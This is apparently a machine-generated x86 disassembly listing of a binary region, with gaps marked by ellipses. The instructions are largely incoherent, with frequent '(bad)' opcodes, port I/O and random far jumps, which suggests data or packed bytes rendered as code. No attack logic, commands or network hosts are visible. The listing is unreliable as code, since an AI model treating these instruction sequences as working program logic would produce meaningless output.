  424bd8:	pop    ebp
  424bd9:	sub    esp,edi
  424bdb:	push   ss
  424bdc:	rcl    DWORD PTR [ebp+0x72322eb3],1
  424be2:	call   0x1f54ded0
  424be7:	cmp    eax,DWORD PTR [ebp-0x77]
  424bea:	mov    esp,0xe0521f98
  424bef:	loop   0x424b93
  424bf1:	outs   dx,BYTE PTR ds:[esi]
  424bf2:	xchg   ebp,eax
  424bf3:	mov    al,ds:0xf47f90ee
  424bf8:	repz sub DWORD PTR [ebx+0x78574801],0x40dd68a2
  424c03:	cwde   
  424c04:	mov    ebp,0xa074b1e9
  424c09:	mov    ebp,0x15416c8e
  424c0e:	xor    DWORD PTR [ecx],ecx
  424c10:	jle    0x424ba0
  424c12:	dec    edi
  424c13:	inc    eax
  424c14:	xor    dh,BYTE PTR [esi-0x5b1ff78d]
  424c1a:	cdq    
  424c1b:	jg     0x424ba3
  424c1d:	xchg   esi,eax
  424c1e:	dec    esp
  424c1f:	inc    ebx
  424c20:	push   ss
  424c21:	stos   BYTE PTR es:[edi],al
  424c22:	int    0x69
  424c24:	fisub  WORD PTR cs:[esi-0x1b1c726b]
  424c2b:	in     eax,0x76
  424c2d:	scas   eax,DWORD PTR es:[edi]
  424c2e:	les    eax,FWORD PTR [edi]
  424c30:	rsqrtps xmm1,xmm2
  424c33:	and    esi,ecx
  424c35:	add    eax,ebx
  424c37:	mov    ebp,0x63b6f331
  424c3c:	cmp    cl,al
  424c3e:	rol    esi,1
  424c40:	dec    ebx
  424c41:	mov    bh,0x9d
  424c43:	jnp    0x424c32
  424c45:	adc    eax,0x5852a837
  424c4a:	xchg   BYTE PTR [esi+0x31],ch
  424c4d:	les    edi,FWORD PTR [ebx]
  424c4f:	into   
  424c50:	dec    ebx
  424c51:	pop    esi
  424c52:	mov    eax,0x8995ad2b
  424c57:	adc    DWORD PTR [edi],ecx
  424c59:	mov    edx,0xbbb85d0f
  424c5e:	rcr    BYTE PTR [edx],cl
  424c60:	shr    BYTE PTR [edx+0x42],1
  424c63:	add    DWORD PTR [edx-0x308c21cf],0x7c
  424c6a:	pop    esp
  424c6b:	repz push eax
  424c6d:	fnsave [edi-0x49c62f4f]
  424c73:	les    esp,FWORD PTR [edi+0x86fd8d0]
  424c79:	sbb    eax,0x661d0da1
  424c7e:	and    ebx,ebx
  424c80:	(bad)  
  424c81:	outs   dx,DWORD PTR ds:[esi]
  424c82:	std    
  424c83:	and    DWORD PTR [eax-0x9ef76a3],eax
  424c89:	dec    ecx
  424c8a:	inc    ebp
  424c8b:	push   esi
  424c8c:	mov    eax,0xd2fea5
	...
  424cf1:	add    BYTE PTR [eax],al
  424cf3:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  424cf7:	push   0xffffffb6
  424cf9:	outs   dx,BYTE PTR ds:[esi]
  424cfa:	(bad)  
  424cfb:	fisub  WORD PTR [edx-0x65]
  424cfe:	test   al,0x51
  424d00:	pop    edi
  424d01:	mul    DWORD PTR [edx+eiz*4-0x54]
  424d05:	mov    BYTE PTR [ecx],al
  424d07:	add    BYTE PTR [ecx+eax*1],al
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	xor    DWORD PTR [edi+0x1b],esp
  424d0f:	sbb    esp,edi
  424d11:	ret    0xf9f2
  424d14:	jne    0x424d2c
  424d16:	fs xchg edi,eax
  424d18:	mov    ds:0x8ba3e968,eax
  424d1d:	loope  0x424cda
  424d1f:	daa    
  424d20:	loopne 0x424ce4
  424d22:	inc    edx
  424d23:	pop    eax
  424d24:	push   bx
  424d26:	fsqrt  
  424d28:	sub    esi,ebx
  424d2a:	mov    bl,0xd5
  424d2c:	xor    al,0x46
  424d2e:	(bad)  
  424d2f:	xchg   edx,eax
  424d30:	and    DWORD PTR [edx+0x7d64eb33],0xffffffa3
  424d37:	xchg   BYTE PTR [ebp+eax*4-0x75],dh
  424d3b:	cmp    al,0xd0
  424d3d:	retf   
  424d3e:	dec    edx
  424d3f:	jnp    0x424d88
  424d41:	jne    0x424daa
  424d43:	mov    dh,0xfd
  424d45:	rcl    BYTE PTR [ebx+0x5a5e475b],1
  424d4b:	in     eax,dx
  424d4c:	pop    esp
  424d4d:	ja     0x424d98
  424d4f:	test   esp,edx
  424d51:	ret    
  424d52:	inc    edx
  424d53:	shr    bh,1
  424d55:	retf   0xee44
  424d58:	push   ss
  424d59:	push   esp
  424d5a:	test   bl,bh
  424d5c:	or     dl,cl
  424d5e:	les    ecx,FWORD PTR [edi]
  424d60:	inc    ecx
  424d61:	jge    0x424ddb
  424d63:	xchg   ecx,eax
  424d64:	das    
  424d65:	aam    0xd5
  424d67:	mov    ecx,0xca9b5a30
  424d6c:	enter  0x8bf7,0x9d
  424d70:	mov    ebx,0xfce24cf2
  424d75:	rcr    dl,cl
  424d77:	sub    eax,0x2bfd3a7d
  424d7c:	mov    ebp,0x41fd2149
  424d81:	and    cl,BYTE PTR [ecx+0xe226e0c]
  424d87:	into   
  424d88:	mov    ch,0x34
  424d8a:	mov    edx,0xce60e2a8
  424d8f:	xor    eax,0x7093e114
  424d94:	jns    0x424d4d
  424d96:	and    BYTE PTR [edx+0x332232bc],dl
  424d9c:	fstp   TBYTE PTR [eax+0x6a]
  424d9f:	rol    DWORD PTR [eax-0x5559d5c1],0x1d
  424da6:	cmp    dh,BYTE PTR [edi]
  424da8:	push   ebx
  424da9:	icebp  
  424daa:	mov    cs,WORD PTR [esi]
  424dac:	push   esp
  424dad:	push   edx
  424dae:	sbb    eax,0x9173dd1f
  424db3:	sbb    DWORD PTR [edx],ecx
  424db5:	(bad)  
  424db6:	push   cs
  424db7:	shl    BYTE PTR [eax+0x50],0xc6
  424dbb:	xchg   ecx,eax
  424dbc:	xor    BYTE PTR [edi+eiz*8-0x1e],bl
  424dc0:	pop    ecx
  424dc1:	sbb    eax,0x47568fe8
  424dc6:	fisttp QWORD PTR [edx-0x12048a7b]
  424dcc:	push   esi
  424dcd:	les    ecx,FWORD PTR [ebx+0x5a73bd36]
  424dd3:	xor    BYTE PTR [eax+eiz*8],dh
  424dd6:	dec    edx
  424dd7:	and    ebp,DWORD PTR [eax-0x5adb3cfd]
  424ddd:	cs mov ah,0x7c
  424de0:	push   ebp
  424de1:	adc    ebp,DWORD PTR ss:[edi-0x271c8e71]
  424de8:	dec    ebp
  424de9:	mov    DWORD PTR [ecx-0x42],ebp
  424dec:	and    ecx,0xffffff9d
  424def:	xlat   BYTE PTR ds:[ebx]
  424df0:	push   esp
  424df1:	mov    ah,0x14
  424df3:	xor    dl,bh
  424df5:	loop   0x424e38
  424df7:	mov    eax,0xfcb5674d
  424dfc:	mov    esp,0x1993deb1
  424e01:	push   cs
  424e02:	mov    ds:0xe4c2b4c6,al
  424e07:	pop    ds
  424e08:	outs   dx,BYTE PTR ds:[esi]
  424e09:	outs   dx,DWORD PTR ds:[esi]
  424e0a:	loopne 0x424e64
  424e0c:	jno    0x424dbc
  424e0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e0f:	fwait
	...
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424ed5
  424e81:	ss into 
  424e83:	sub    esi,DWORD PTR [eax+0x4000189]
  424e89:	add    DWORD PTR [eax],eax
  424e8b:	add    BYTE PTR [esi],dh
  424e8d:	mov    gs,WORD PTR [ecx+eax*2-0x40]
  424e91:	ds push 0xffffffbb
  424e94:	add    eax,0xbb39f84c
  424e99:	xor    DWORD PTR [edi-0x4d],ebx
  424e9c:	add    edx,DWORD PTR [edi-0x3ad8b8ba]
  424ea2:	mov    edx,0x7aa21ea1
  424ea7:	adc    BYTE PTR [ecx+ebp*2],dh
  424eaa:	loop   0x424ed6
  424eac:	lahf   
  424ead:	inc    esp
  424eae:	jns    0x424e41
  424eb0:	mov    al,0x52
  424eb2:	xchg   DWORD PTR [esi+0x24],ebp
  424eb5:	inc    eax
  424eb6:	sbb    cl,cl
  424eb8:	xchg   ecx,eax
  424eb9:	dec    ebp
  424eba:	loop   0x424f1b
  424ebc:	test   edx,edi
  424ebe:	clc    
  424ebf:	xchg   ebx,eax
  424ec0:	or     bl,0x8f
  424ec3:	push   es
  424ec4:	outs   dx,BYTE PTR ds:[esi]
  424ec5:	loope  0x424f2b
  424ec7:	adc    DWORD PTR [edi+ebx*1+0x342a4d27],esp
  424ece:	(bad)  
  424ecf:	into   
  424ed0:	out    0x95,eax
  424ed2:	jno    0x424ed2
  424ed4:	stos   BYTE PTR es:[edi],al
  424ed5:	pop    ebp
  424ed6:	cmp    ebp,0xb3fefebb
  424edc:	sbb    eax,0xe98ffcdb
  424ee1:	jp     0x424ee2
  424ee3:	add    al,0xcd
  424ee5:	(bad)  
  424ee6:	daa    
  424ee7:	or     al,0x20
  424ee9:	xchg   edx,eax
  424eea:	lods   eax,DWORD PTR ds:[esi]
  424eeb:	add    al,0xc3
  424eed:	or     dl,0xa5
  424ef0:	in     al,0x4c
  424ef2:	dec    edi
  424ef3:	cmp    dl,BYTE PTR [ecx+0x17]
  424ef6:	(bad)
  424efa:	test   ebx,0x269bf399
  424f00:	fisttp WORD PTR [eiz*2+0x71ad4848]
  424f07:	inc    edx
  424f08:	xchg   esp,eax
  424f09:	pop    esi
  424f0a:	xchg   esi,eax
  424f0b:	and    eax,edx
  424f0d:	mov    al,ds:0x4f998196
  424f12:	xchg   esp,eax
  424f13:	mov    ch,0xc8
  424f15:	fisttp DWORD PTR [esi+0x70]
  424f18:	xor    edx,DWORD PTR [eax-0x2e]
  424f1b:	pop    ebp
  424f1c:	cmp    ah,bl
  424f1e:	dec    ebx
  424f1f:	in     al,0x72
  424f21:	neg    DWORD PTR [ebx-0x171ca969]
  424f27:	sub    al,0x80
  424f29:	cmp    BYTE PTR [edx+ebx*1+0x5a0894a9],0x42
  424f31:	fild   WORD PTR [ecx-0x1d89138e]
  424f37:	sub    ebp,DWORD PTR [esi]
  424f39:	mov    ch,0x54
  424f3b:	dec    ebx
  424f3c:	fs sbb eax,0xcd6ec216
  424f42:	sub    ah,BYTE PTR [eax+0x610b4ba3]
  424f48:	push   cs
  424f49:	push   esp
  424f4a:	mov    al,BYTE PTR [eax+0x13e92361]
  424f50:	jmp    0x424f82
  424f52:	in     eax,0x3e
  424f54:	sub    edi,DWORD PTR [edx]
  424f56:	pop    ebp
  424f57:	inc    esp
  424f58:	xor    DWORD PTR [ebx-0xc],ebp
  424f5b:	pop    es
  424f5c:	sub    al,0xb5
  424f5e:	mov    bl,0x3b
  424f60:	inc    edi
  424f61:	ins    BYTE PTR es:[edi],dx
  424f62:	mov    eax,ds:0x370a38af
  424f67:	nop
  424f68:	push   cs
  424f69:	or     esp,DWORD PTR ds:0x1d769098
  424f6f:	shr    DWORD PTR [edi+0x2d],1
  424f72:	ret    0xd683
  424f75:	or     DWORD PTR [ebx+0x51],0x6c
  424f79:	shl    eax,1
  424f7b:	out    0x9b,eax
  424f7d:	push   ds
  424f7e:	xor    DWORD PTR [edi],esi
  424f80:	shr    DWORD PTR es:[eiz*1+0xc73bea1],1
  424f88:	jge    0x424f2c
  424f8a:	fsubr  DWORD PTR [edi]
  424f8c:	enter  0xadda,0x3e
	...
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	stc    
  425001:	(bad)  
  425002:	adc    BYTE PTR [ecx],ch
  425004:	mov    ah,0x8a
  425006:	add    DWORD PTR [eax],eax
  425008:	add    al,0x1
  42500a:	add    BYTE PTR [eax],al
  42500c:	cld    
  42500d:	repz push cs
  42500f:	xchg   esi,eax
  425010:	or     eax,0xa4928d0d
  425015:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425016:	jno    0x424fb4
  425018:	xor    eax,0xd9826c4b
  42501d:	dec    edi
  42501e:	mov    edi,DWORD PTR [ecx]
  425020:	inc    eax
  425021:	ret    0x1663
  425024:	not    DWORD PTR [eax]
  425026:	imul   ecx,DWORD PTR [ecx-0x34],0xffffffcb
  42502a:	jne    0x425034
  42502c:	jne    0x424ffb
  42502e:	fisub  WORD PTR [esi+edi*8-0x2153cae0]
  425035:	jmp    0x424fe0
  425037:	fistp  QWORD PTR [esi+eax*2]
  42503a:	fsub   QWORD PTR [ebx+0x18a5b7c4]
  425040:	mov    al,0x3a
  425042:	shl    BYTE PTR cs:[ebx],1
  425045:	(bad)  
  425046:	xlat   BYTE PTR ds:[ebx]
  425047:	and    edx,DWORD PTR [ecx]
  425049:	add    eax,0xf250ba98
  42504e:	jl     0x42500b
  425050:	mov    esp,0x676f788d
  425055:	rcl    al,0x10
  425058:	adc    ecx,esi
  42505a:	mov    DWORD PTR [ecx],esi
  42505c:	xor    eax,0x3f806dc9
  425061:	xor    DWORD PTR [edx-0x1add0377],0x1c
  425068:	lock popa 
  42506a:	test   al,0xea
  42506c:	sub    al,0xe7
  42506e:	lods   al,BYTE PTR ds:[esi]
  42506f:	stc    
  425070:	addr16 out dx,eax
  425072:	or     dl,0xee
  425075:	mov    esi,0xb5ad2807
  42507a:	xor    eax,0xedcebaa0
  42507f:	push   ds
  425080:	aas    
  425081:	(bad)  
  425082:	in     eax,dx
  425083:	add    edi,esi
  425085:	mov    bh,0xfc
  425087:	pop    ecx
  425088:	add    al,0xef
  42508a:	adc    BYTE PTR [ecx-0x38],cl
  42508d:	inc    edx
  42508e:	and    al,0x6a
  425090:	xchg   DWORD PTR [edi-0x3],esi
  425093:	les    esi,FWORD PTR [ebp+0x4e6376c8]
  425099:	pop    edx
  42509a:	mov    ch,0xc8
  42509c:	xor    eax,DWORD PTR [edi-0x1436708f]
  4250a2:	(bad)  
  4250a3:	js     0x4250af
  4250a5:	mov    BYTE PTR ds:0x3f399ea2,dl
  4250ab:	retf   0x4cc6
  4250ae:	(bad)  
  4250af:	(bad)  
  4250b0:	cwde   
  4250b1:	and    ebx,DWORD PTR [ebp-0x68]
  4250b4:	or     ch,BYTE PTR [ebx-0x19]
  4250b7:	dec    edx
  4250b8:	lds    esi,FWORD PTR [eax-0x1be2aeaa]
  4250be:	and    al,0x19
  4250c0:	push   edx
  4250c1:	and    eax,0x8d2c4e96
  4250c6:	push   ss
  4250c7:	mov    cl,0xe9
  4250c9:	pop    ds
  4250ca:	inc    ebp
  4250cb:	ror    BYTE PTR [esi],0x67
  4250ce:	(bad)
  4250d1:	popf   
  4250d2:	pop    eax
  4250d3:	jmp    0x42509b
  4250d5:	ins    BYTE PTR es:[edi],dx
  4250d6:	xlat   BYTE PTR ds:[ebx]
  4250d7:	fst    st(2)
  4250d9:	push   edx
  4250da:	mov    ebx,0xc3f7294a
  4250df:	dec    ecx
  4250e0:	fistp  QWORD PTR [esi+0x8]
  4250e3:	ja     0x4250ac
  4250e5:	jae    0x4250b7
  4250e7:	fisttp WORD PTR [ecx+0x11]
  4250ea:	xchg   ebx,eax
  4250eb:	or     bl,dl
  4250ed:	or     cl,bh
  4250ef:	jae    0x425105
  4250f1:	sub    BYTE PTR [edi+0x1f3b2f64],cl
  4250f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4250f8:	xor    cl,dh
  4250fa:	xchg   ebp,eax
  4250fb:	jbe    0x425173
  4250fd:	ins    DWORD PTR es:[edi],dx
  4250fe:	and    BYTE PTR [edi],bh
  425100:	mov    bl,ch
  425102:	mov    ah,BYTE PTR [esi-0x66]
  425105:	stos   DWORD PTR es:[edi],eax
  425106:	int3   
  425107:	in     al,0x0
  425109:	lods   al,BYTE PTR ds:[esi]
  42510a:	push   ebp
  42510b:	dec    eax
  42510c:	int3   
  42510d:	add    BYTE PTR [edi-0x1f],0x0
	...
  425171:	add    BYTE PTR [eax],al
  425173:	add    dh,bl
  425175:	adc    DWORD PTR [edi-0x15020dd],ebx
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0xe0fc:0x962692e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    BYTE PTR [edx+0x49],bl
  42518e:	inc    ebp
  42518f:	imul   edi,DWORD PTR [ecx+0x49],0x21
  425193:	mov    DWORD PTR [eax-0x6714a1a7],esp
  425199:	retf   
  42519a:	cmc    
  42519b:	les    esi,FWORD PTR [ebp+0x46066c0f]
  4251a1:	push   ss
  4251a2:	sbb    ch,BYTE PTR [ebx]
  4251a4:	fbld   TBYTE PTR [ecx-0x478aa1f3]
  4251aa:	in     al,dx
  4251ab:	fistp  WORD PTR [edi-0x42298eee]
  4251b1:	or     eax,0xd6c84336
  4251b6:	sbb    ebx,ecx
  4251b8:	mov    ebp,0xe24f42a9
  4251bd:	fcomp  DWORD PTR cs:[edx+ebx*8]
  4251c1:	repnz xchg esp,eax
  4251c3:	sbb    edi,DWORD PTR [esi]
  4251c5:	mov    ?,WORD PTR ds:0x6f87b2a1
  4251cb:	arpl   WORD PTR [ebp-0x14],ax
  4251ce:	sub    eax,DWORD PTR es:[ecx]
  4251d1:	popf   
  4251d2:	xor    al,0x87
  4251d4:	pop    ebp
  4251d5:	clc    
  4251d6:	rcl    DWORD PTR [edx-0x79cc544f],0xa2
  4251dd:	push   ebp
  4251de:	push   edi
  4251df:	mov    bh,0x23
  4251e1:	fidiv  DWORD PTR [ebx+0x2428045d]
  4251e7:	(bad)  
  4251e8:	jl     0x425266
  4251ea:	stos   DWORD PTR es:[edi],eax
  4251eb:	fnstenv [edi-0x20]
  4251ee:	ins    BYTE PTR es:[edi],dx
  4251ef:	popf   
  4251f0:	adc    DWORD PTR [ecx],0xb22c91d6
  4251f6:	mov    al,0x28
  4251f8:	mov    ebx,0x4260104e
  4251fd:	mov    ds:0xe97db7fc,al
  425202:	push   esp
  425203:	dec    esi
  425204:	scas   al,BYTE PTR es:[edi]
  425205:	lds    esp,FWORD PTR [esi+esi*8]
  425208:	sub    dh,BYTE PTR [edx]
  42520a:	jo     0x42519b
  42520c:	and    eax,0x74e951f5
  425211:	in     al,dx
  425212:	and    eax,0xbcc18cb4
  425217:	sbb    eax,0x57413ae8
  42521c:	mov    eax,ds:0xde032619
  425221:	cs jmp 0x7d21d4f5
  425227:	stos   DWORD PTR es:[edi],eax
  425228:	nop
  425229:	xchg   ebp,eax
  42522a:	test   eax,0xc3af5fe2
  42522f:	jb     0x4252ad
  425231:	scas   al,BYTE PTR es:[edi]
  425232:	dec    esp
  425233:	push   esi
  425234:	adc    ebx,DWORD PTR [edx-0x7b]
  425237:	xlat   BYTE PTR ds:[ebx]
  425238:	test   al,0x86
  42523a:	adc    ch,0x3c
  42523d:	dec    edi
  42523e:	cmp    eax,0x1c05d801
  425243:	pop    ss
  425244:	(bad)
  425248:	adc    bl,BYTE PTR [ecx-0x75412a43]
  42524e:	push   ds
  42524f:	add    eax,0x9f36d884
  425254:	popf   
  425255:	jnp    0x4251dc
  425257:	lds    esp,FWORD PTR [ecx-0x3d]
  42525a:	dec    ebx
  42525b:	aad    0x60
  42525d:	mov    bl,bl
  42525f:	push   ebx
  425260:	jg     0x425291
  425262:	push   esi
  425263:	out    0x5b,eax
  425265:	push   ebp
  425266:	addr16 mov cl,0x75
  425269:	sub    BYTE PTR [edx+eiz*8],bl
  42526c:	dec    ebp
  42526d:	add    esp,ebx
  42526f:	cmp    BYTE PTR [edi-0x63],0xa5
  425273:	idiv   bl
  425275:	and    edx,DWORD PTR [edx+ebx*4-0x7e]
  425279:	xor    al,0x8
  42527b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42527c:	mov    dl,0x1
  42527e:	arpl   WORD PTR [esi-0x43d5d272],sp
  425284:	mov    edx,0xa2005b0
  425289:	mov    al,ds:0xbce656a3
  42528e:	sub    ebx,DWORD PTR [ecx]
	...
  4252f4:	lods   al,BYTE PTR ds:[esi]
  4252f5:	les    esi,FWORD PTR [ebx-0x32]
  4252f8:	jnp    0x4252f9
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	sbb    al,0x45
  425302:	shl    bh,cl
  425304:	mov    esp,0x400018c
  425309:	add    DWORD PTR [eax],eax
  42530b:	add    BYTE PTR [esi+esi*2+0x6f],ah
  42530f:	call   FWORD PTR [edx+0x498bedde]
  425315:	test   DWORD PTR [edx+0x37],edi
  425318:	popa   
  425319:	out    dx,al
  42531a:	jne    0x425380
  42531c:	cmp    eax,0xf2c2430b
  425321:	add    DWORD PTR [ecx+0x2bfc21bc],esi
  425327:	dec    edi
  425328:	fwait
  425329:	ins    DWORD PTR es:[edi],dx
  42532a:	les    ecx,FWORD PTR [eax]
  42532c:	push   cs
  42532d:	int    0xd4
  42532f:	sub    DWORD PTR [esi+ebx*4-0x2a],ebp
  425333:	cmp    bl,BYTE PTR [esi+0x7da6ec9e]
  425339:	retf   
  42533a:	mov    ds:0xae2e6e95,eax
  42533f:	add    dl,BYTE PTR ds:0x4dc66eb6
  425345:	inc    esi
  425346:	jb     0x4252eb
  425348:	push   0xc88b61e8
  42534d:	mov    eax,0xd6c87fe
  425352:	fs mov ebx,0xaa058a9b
  425358:	lods   al,BYTE PTR ds:[esi]
  425359:	ds pop esp
  42535b:	pop    ecx
  42535c:	pop    ds
  42535d:	or     BYTE PTR [ecx],dl
  42535f:	aas    
  425360:	sahf   
  425361:	(bad)  
  425362:	cmp    ecx,esi
  425364:	dec    ebp
  425365:	fs mov edi,0xe658fd52
  42536b:	and    al,0x98
  42536d:	out    dx,al
  42536e:	inc    eax
  42536f:	adc    di,WORD PTR [esp+eax*2]
  425373:	sahf   
  425374:	jge    0x42534d
  425376:	loopne 0x4252fb
  425378:	or     al,0x7
  42537a:	dec    ebp
  42537b:	loope  0x4253f3
  42537d:	sub    ah,BYTE PTR [edx+0x79]
  425380:	(bad)  
  425381:	ror    DWORD PTR [ebp-0x6a],cl
  425384:	mov    cl,BYTE PTR [esp+edx*4-0xe]
  425388:	mov    dl,al
  42538a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42538b:	mov    eax,0x2e3e9d88
  425390:	dec    edi
  425391:	in     al,dx
  425392:	stc    
  425393:	out    dx,al
  425394:	add    DWORD PTR [ebx-0xe],ebp
  425397:	cs xchg edx,eax
  425399:	mov    eax,ds:0xd8b19328
  42539e:	cdq    
  42539f:	sbb    esi,DWORD PTR [ebp-0x320e903d]
  4253a5:	cmp    ah,bl
  4253a7:	or     BYTE PTR [edx-0x40],dl
  4253aa:	jo     0x425399
  4253ac:	pop    ebp
  4253ad:	xor    al,0xf1
  4253af:	mov    al,0x9d
  4253b1:	jno    0x425424
  4253b3:	add    eax,DWORD PTR [ecx+eax*8-0x7c]
  4253b7:	retf   0xcb49
  4253ba:	xor    eax,0x37b5f761
  4253bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4253c0:	call   0xf567:0xea89b9fa
  4253c7:	(bad)  
  4253c8:	mov    dh,0xa6
  4253ca:	xor    esi,esi
  4253cc:	scas   al,BYTE PTR es:[edi]
  4253cd:	(bad)  
  4253ce:	xor    ch,BYTE PTR [edx+0x4]
  4253d1:	inc    eax
  4253d2:	fst    QWORD PTR [eax+0x52]
  4253d5:	in     al,0xbc
  4253d7:	inc    ecx
  4253d8:	pop    DWORD PTR [edx-0x70]
  4253db:	xchg   ebp,eax
  4253dc:	inc    edx
  4253dd:	mov    al,ds:0x6d115ff0
  4253e2:	lock adc eax,DWORD PTR [eax]
  4253e5:	mov    ah,0xf8
  4253e7:	int3   
  4253e8:	mov    DWORD PTR [ebx+0x23600691],ecx
  4253ee:	out    dx,al
  4253ef:	xchg   esi,eax
  4253f0:	adc    al,0x27
  4253f2:	mov    ah,0xb2
  4253f4:	pop    edi
  4253f5:	cmp    BYTE PTR [edx+edx*8-0x3f3b446e],dl
  4253fc:	addr16 pusha 
  4253fe:	jg     0x4253a2
  425400:	mov    dh,0xbb
  425402:	sub    BYTE PTR [esi-0x6b623951],ah
  425408:	pop    ds
  425409:	xor    eax,0x96188679
  42540e:	jl     0x4253a5
	...
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ebx,DWORD PTR [ebx-0x7d]
  425482:	adc    BYTE PTR [eax+eax*8+0x400018d],bh
  425489:	add    DWORD PTR [eax],eax
  42548b:	add    ch,cl
  42548d:	mov    al,ds:0x7ae8aedf
  425492:	xchg   ecx,eax
  425493:	xor    eax,0x2793b950
  425498:	mov    esi,0xc6462ba6
  42549d:	push   edx
  42549e:	and    DWORD PTR [esi],eax
  4254a0:	lock pushf 
  4254a2:	icebp  
  4254a3:	fisttp DWORD PTR [edx]
  4254a5:	imul   ebx,DWORD PTR gs:[ebx],0xebe4089a
  4254ac:	and    dl,BYTE PTR [ecx+eiz*8+0x11260221]
  4254b3:	mov    al,0xf9
  4254b5:	ret    0x16bd
  4254b8:	push   0xcacace6e
  4254bd:	scas   al,BYTE PTR es:[edi]
  4254be:	sub    BYTE PTR [eax+0x4783047c],al
  4254c4:	sub    dh,BYTE PTR [edx+0x6c]
  4254c7:	(bad)  
  4254c8:	and    edx,eax
  4254ca:	scas   al,BYTE PTR es:[edi]
  4254cb:	inc    esp
  4254cc:	popf   
  4254cd:	push   ss
  4254ce:	pop    edi
  4254cf:	pushf  
  4254d0:	shl    DWORD PTR [edx-0x23],0x16
  4254d4:	adc    al,0x65
  4254d6:	enter  0x520d,0xe
  4254da:	dec    edi
  4254db:	paddsw mm0,QWORD PTR [eax+0x31]
  4254df:	sub    esp,edx
  4254e1:	imul   esp,DWORD PTR [ebx-0x52],0xffffffd2
  4254e5:	or     cl,BYTE PTR [ebx+0xd]
  4254e8:	xor    BYTE PTR ds:0xd07e97c8,0xf0
  4254ef:	push   esp
  4254f0:	push   es
  4254f1:	mov    bh,0xe0
  4254f3:	or     DWORD PTR [ebx+eiz*1+0x45fffbe8],0x19
  4254fb:	adc    bl,BYTE PTR [edi+edx*4]
  4254fe:	call   0xf728e615
  425503:	cmp    bh,BYTE PTR [ebx-0x53]
  425506:	inc    edi
  425507:	retf   
  425508:	inc    esp
  425509:	jo     0x425559
  42550b:	add    eax,0xb36f65ea
  425510:	pop    edi
  425511:	ficomp WORD PTR [ecx-0x28]
  425514:	sahf   
  425515:	mul    DWORD PTR [ebx]
  425517:	test   BYTE PTR [ecx+edx*4],bh
  42551a:	scas   eax,DWORD PTR es:[edi]
  42551b:	dec    ebp
  42551c:	cld    
  42551d:	pusha  
  42551e:	je     0x4254cc
  425520:	lods   al,BYTE PTR ds:[esi]
  425521:	and    BYTE PTR [eax+esi*4+0x36],bh
  425525:	stc    
  425526:	dec    eax
  425527:	dec    ebx
  425528:	ins    BYTE PTR es:[edi],dx
  425529:	pop    es
  42552a:	je     0x4254c5
  42552c:	outs   dx,BYTE PTR ds:[esi]
  42552d:	or     ah,BYTE PTR [edi+eiz*4-0x39]
  425531:	dec    eax
  425532:	ret    
  425533:	and    BYTE PTR [ebp-0x3062eb34],0x70
  42553a:	hlt    
  42553b:	in     eax,0x7b
  42553d:	jb     0x42555c
  42553f:	pop    ebx
  425540:	jle    0x42550c
  425542:	adc    eax,esi
  425544:	out    0xc3,al
  425546:	sbb    eax,0x609d4c1e
  42554b:	push   edx
  42554c:	push   0xd3db08d
  425551:	jmp    0xa800:0xe8808f9d
  425558:	aam    0x28
  42555a:	sub    BYTE PTR [edi],0x2d
  42555d:	lods   al,BYTE PTR ds:[esi]
  42555e:	xor    bh,cl
  425560:	mov    dl,0xcb
  425562:	push   es
  425563:	ror    cl,1
  425565:	cmp    eax,0x6399d572
  42556a:	sbb    DWORD PTR [edi-0x29],0xc1ac3cca
  425571:	enter  0xbc3b,0xfb
  425575:	addr16 jae 0x425583
  425578:	cmp    BYTE PTR [ebx-0x7ba3b2a0],0xa6
  42557f:	stos   DWORD PTR es:[edi],eax
  425580:	sbb    BYTE PTR [ecx-0x55fcb143],0x67
  425587:	xlat   BYTE PTR ds:[ebx]
  425588:	xchg   bl,ah
  42558a:	dec    esp
  42558b:	stos   DWORD PTR es:[edi],eax
  42558c:	xchg   edx,eax
  42558d:	arpl   WORD PTR [edx],di
  42558f:	push   0x0
	...
  4255f4:	(bad)  
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x5722f13a
  425602:	inc    esp
  425603:	sbb    esp,eax
  425605:	mov    es,WORD PTR [ecx]
  425607:	add    BYTE PTR [ecx+eax*1],al
  42560a:	add    BYTE PTR [eax],al
  42560c:	aas    
  42560d:	jg     0x425610
  42560f:	jo     0x4255eb
  425611:	xor    eax,0x3d72a01a
  425616:	push   0x66
  425618:	leave  
  425619:	cmp    eax,0xb0c9abe
  42561e:	pusha  
  42561f:	dec    eax
  425620:	mov    ds:0xbddd5f36,ax
  425626:	jns    0x4255d9
  425628:	xchg   edi,eax
  425629:	rol    DWORD PTR [edi],0xc8
  42562c:	sbb    DWORD PTR ds:0x6b8d537b,edi
  425632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425633:	mov    bl,0x1d
  425635:	in     eax,0x5d
  425637:	mov    cl,0x5a
  425639:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42563a:	mov    edx,0x14199d18
  42563f:	or     BYTE PTR [ecx+0x6b48226e],bl
  425645:	add    al,0x52
  425647:	xchg   esp,eax
  425648:	leave  
  425649:	jecxz  0x4256a1
  42564b:	sar    DWORD PTR [eax-0x2ecf7342],cl
  425651:	mov    ds:0x147d1eb1,al
  425656:	adc    eax,0x93fe9244
  42565b:	rcr    DWORD PTR [esi-0x72],0xc3
